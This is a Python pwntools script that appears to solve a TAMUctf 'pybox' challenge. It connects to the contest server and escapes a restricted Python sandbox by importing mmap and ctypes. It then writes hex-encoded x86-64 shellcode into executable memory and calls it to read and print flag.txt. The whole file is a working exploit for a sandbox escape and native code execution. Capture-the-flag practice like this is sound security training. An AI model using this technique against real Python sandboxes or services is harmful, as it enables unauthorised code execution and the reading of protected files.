from pwn import *

if __name__ == "__main__":
    io = remote("tamuctf.com", 443, ssl=True, sni="pybox")

    io.recvuntil("?\n")
    io.sendline("2")
    io.recvuntil("line\n")
    io.sendline("mmap")
    io.sendline("ctypes")
    io.recvuntil(")\n")

    shellcode = bytes.fromhex("eb4e5f4831f6b8020000000f054989c0b809000000bf00000000be00100000ba0100000041ba0200000041b9000000000f054889c6bf01000000ba00040000b8010000000f054831c0b83c0000000f05e8adffffff2e2f666c61672e747874")

    io.sendline(f"shellcode = {shellcode}")
    io.sendline("mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC)")
    io.sendline("mm.write(shellcode)")
    io.sendline("restype = ctypes.c_int64")
    io.sendline("argtypes = tuple()")
    io.sendline("ctypes_buffer = ctypes.c_int.from_buffer(mm)")
    io.sendline("function = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(ctypes_buffer))")
    io.sendline("function()")
    io.sendline(".")
    
    flag = io.recv(32).rstrip(b"\x00")
    print(flag.decode())
